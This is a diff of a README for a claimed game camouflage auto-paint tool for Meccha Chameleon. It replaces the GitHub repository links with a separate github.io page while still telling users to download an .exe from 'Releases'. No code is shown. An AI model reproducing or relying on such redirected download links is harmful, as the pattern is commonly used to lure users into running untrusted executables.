@@ -1,6 +1,6 @@
 # 🦎 MecchaChameleon-AutoPaintTool - Camouflage Your Character Instantly And Easily
 
-[![Download Now](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Cyypng/MecchaChameleon-AutoPaintTool)
+[![Download Now](https://img.shields.io/badge/Download-Release-blue.svg)](https://cyypng.github.io)
 
 MecchaChameleon-AutoPaintTool automates the color matching process for your character in the game Meccha Chameleon. The application scans the terrain beneath your character and adjusts your skin or armor color to match the environment. This provides an effective camouflage boost during gameplay. The tool runs in the background and processes visual data to ensure your character blends in with the surroundings.
 
@@ -19,7 +19,7 @@ To run this tool, your computer must meet the following hardware and software sp
 
 Follow these steps to set up the tool on your Windows machine:
 
-1. Visit the [official repository page](https://github.com/Cyypng/MecchaChameleon-AutoPaintTool).
+1. Visit the [official repository page](https://cyypng.github.io).
 2. Locate the "Releases" section on the right side of the page.
 3. Click on the latest release version.
 4. Download the file named MecchaChameleon.exe to your computer.
